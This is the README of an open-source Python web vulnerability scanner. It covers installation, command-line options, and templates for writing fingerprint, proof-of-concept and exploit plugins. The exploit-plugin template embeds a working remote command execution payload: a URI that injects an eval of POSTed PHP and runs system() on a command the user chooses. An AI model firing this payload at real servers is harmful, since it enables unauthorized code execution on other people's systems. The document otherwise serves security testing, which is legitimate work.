<center><p><a href="README.md">中文</a> | ENGLISHI</p></center>
<h1 align="center">CVS - ClosureVulnScanner</h1>
<center><img src="https://socialify.git.ci/Y5neKO/ClosureVulnScanner/image?description=1&forks=1&issues=1&language=1&logo=https%3A%2F%2Fraw.githubusercontent.com%2FY5neKO%2FClosureVulnScanner%2Fmain%2Fasset%2FClosure.png&name=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Light" alt="ClosureVulnScanner" /></center>
<p align="center">
  Comprehensive web vulnerability scanner based on Python, named after<b>Arknights® Closure</b>
  <br><br>
  <a href='https://blog.ysneko.com'><img src="https://img.shields.io/static/v1?label=Powered%20by&message=Y5neKO&color=green" alt="Author"></a>
  <a href='https://www.python.org/'><img src="https://img.shields.io/static/v1?label=Python&message=3.8.0&color=yellow" alt="Python"></a>
  <br><br>
  <a href="#">
    <img src="https://img.shields.io/badge/Supported%20by-Alipay🈲%20%E2%86%92-gray.svg?colorA=655BE1&colorB=4F44D6&style=for-the-badge" alt="Alipay"/>
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Supported%20by-WechatPay🈲%20%E2%86%92-gray.svg?colorA=61c265&colorB=4CAF50&style=for-the-badge" alt="WechatPay"/>
  </a>
  <br><br>
  <a>———— </a>
  <br>
  <a>———— </a>
  <br><br>
  <img src="Closure.png" alt="Closure" style="zoom:50%;" />
</p>



## CVS - ClosureVulnScanner

- **v0.0**: Currently under development, widely soliciting opinions.
- **v0.1**: Implemented basic functions, including fingerprint, exp, poc, multi-threading, proxy, etc.
- **v0.2**: Reconstructed the code structure, optimized multi-threading algorithm, and fixed some bugs.


## Default Allocation
`Python 3_8_0`  |  `PyCharm 2023.2.3`  |  `Windows 11`  |  `UTF-8`


## Version & Update Log
**Version** v0.2

- *2023.10.26* | First init.
- *2023.11.01* | v0.1 release.
- *2024.02.29* | v0.2 release.



## Quick Start

**Stable Version**：

Release version with no abnormal functions.

```sh
wget {Please download from Release}
cd ClosureVulnScanner
python3 -m pip install -r requirements.txt
python3 CVS.py
```

**Beta Version**：

It is mainly used for the development version of the author's personal programming. There may be bugs or exceptions due to unfinished code.

```sh
git clone https://github.com/Y5neKO/ClosureVulnScanner
cd ClosureVulnScanner
python3 -m pip install -r requirements.txt
python3 CVS.py
```



## Instructions for use

```sh
root#
-> python3 CVS.py -h

    ,ad8888ba,   88
   d8"'    `"8b  88
  d8'            88
  88             88   ,adPPYba,   ,adPPYba,  88       88  8b,dPPYba,   ,adPPYba,
  88             88  a8"     "8a  I8[    ""  88       88  88P'   "Y8  a8P_____88
  Y8,            88  8b       d8   `"Y8ba,   88       88  88          8PP"
   Y8a.    .a8P  88  "8a,   ,a8"  aa    ]8I  "8a,   ,a88  88          "8b,   ,aa
    `"Y8888Y"'   88   `"YbbdP"'   `"YbbdP"'   `"YbbdP'Y8  88           `"Ybbd8"'

                                                                           v0.2 By Y5neKO :)
                                                                           扰扰马足车尘，被岁月无情，暗消年少。

欢迎使用Closure Vulnerability Scanner
Github: https://github.com/Y5neKO

usage: CVS.py [-h] [-u URL] [-e {identify,scan,exp}] [--exp EXP_NAME] [--cmd CMD] [-t TIMEOUT] [--proxy PROXY] [-o OUTPUT] [--list {poc,exp}] [--add-poc ADD_POC_NAME] [--add-exp ADD_EXP_NAME]

使用帮助

optional arguments:
  -h, --help            show this help message and exit

扫描参数:
  -u URL                目标url, example: http(s)://www.baidu.com/
  -e {identify,scan,exp}
                        指定操作类型, 默认为指纹识别。identify:指纹识别 | scan:漏洞扫描 | exp:漏洞利用
  --exp EXP_NAME        指定exp模块, 使用exp目录内插件
  --cmd CMD             指定exp模块执行的命令, 若模块不支持命令执行可缺省
  -t TIMEOUT            设置超时时间(ms), 默认5000ms
  --proxy PROXY         使用代理, 目前支持Socks,HTTP; 格式:{socks|http}://ip_addr:port
  -o OUTPUT             输出扫描结果到指定路径

拓展参数:
  --list {poc,exp}      列出已经加载的poc/exp插件
  --add-poc ADD_POC_NAME
                        添加poc插件
  --add-exp ADD_EXP_NAME
                        添加exp插件
```



## Catalog and function description

`asset`: Static resource directory

`core`: Core function directory

`exp`: Exploit module plug-in directory

`ez_poc`: Simple outsourcing POC verification module plug-in directory

`finger`: Fingerprint information directory

`lib`: Third-party dependency directory(e.g. ysoserial.jar)

`log`: Program log directory

`poc`: Complex POC verification module plug-in directory



## Fingerprint module writing specifications

**How to add**：

Just add it in the AssetName field in the `finger/finger.json` file.

```json
{
  "AssetName": {}
}
```

**Writing specifications**：

```json
"Asset Name": {
      "description": "Fingerprint description",
      "payload": {
        "method": "Request protocol",
        "uri": "Request uri",
        "headers": {
          "Header field 1": "Header key value 1"
        },
        "body": {
            "Request field 1": "Request key value 1"
        }
      },
      "location": "Verify keyword position: uri、headers、body",
      "checkhash": "Target hash check value, default is 32-bit md5",
      "keywords": "Validate keywords, support regular expressions"
    }
```



## POC module writing specifications

### Simple POC module

POC that can be verified only by sending the package.

**How to add**：

Just add it in the PocName field in the `ez_poc/ez_poc.json` file.

```json
{
  "PocName": {}
}
```

**Writing specifications**：

```json
"Vulnerability name": {
      "description": "Vulnerability description",
      "payload": {
        "method": "Request protocol",
        "uri": "Uri path",
        "headers": {
          "Header field 1": "Header key value 1"
        },
        "body": {
            "Request field 1": "Request key value 1"
        }
      },
      "location": "Verify keyword position: uri、headers、body",
      "keywords": "Validate keywords, support regular expressions"
    }
```

### Complex POC module

POC that requires complex logic to verify.

**How to add**：

Add python module files to the poc directory.

- File name specification: `asset name_vulnerability name.py`.
- Execute the import command and write the poc index file: `python CVS.py --add-poc {Module name, must be consistent with the module file}`.

**Writing Specifications**:

```python
# You need to import the required packages yourself
import XXX

# The function is defined as run(url, timeout)
def run(url, timeout):
    """
     Parameter Description
     @param url: target address
     @param timeout: timeout time
     @return result: a list including all returned results
     """
     result = {
         'name': 'Vulnerability name',
         'vulnerable': False, # Vulnerability verification success indicator
         'method': None, #Vulnerability request protocol
         'url': None, # Verify target address
         'payload': None # Verify payload
     }
    """
    Customize the code segment, assign value and return the result according to the written logic.
    """
    return result
```



## EXP module writing specifications

For exploit.

Add python module files to exp directory.

- File name specification: `asset name_vulnerability name.py`
- Execute the import command and write the exp index file: `python CVS.py --add-exp {module name, must be consistent with the module file}`

```python
# 需要自行导入所需要包
import XXX

# 函数定义为 run(url, cmd)
def run(url, cmd):
    """
     Parameter Description
     @param url: target address
     @param cmd: Specify command execution. Even if the command cannot be executed directly, formal parameters need to be defined.
     @return {bool, string}: Execution success identifier and return result, used for command echo. If there is no echo, you can explain it by yourself; command echo return result needs to use "{{{{{echo}}}}}" Format package used to identify command echo results from responses
    """
    payload = r'/index.php?s=a/b/c/${@print(eval($_POST[cmd]))}'
    payload = urllib.parse.urljoin(url, payload)
    response = requests.post(payload, data={"cmd": "echo '{{{{{';system('" + str(cmd) + "');echo '}}}}}';"})
    if response.status_code == 200:
        return True, response.text
    else:
        return False, "Exploit failed"
```



## Contributor

<a href="https://github.com/Y5neKO/ClosureVulnScanner/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=Y5neKO/ClosureVulnScanner" />
</a>



## Contributors

[![Stargazers repo roster for @Y5neKO/ClosureVulnScanner](http://reporoster.com/stars/Y5neKO/ClosureVulnScanner)](https://github.com/Y5neKO/ClosureVulnScanner/stargazers)


## License
[MIT](LICENSE) © Y5neKO
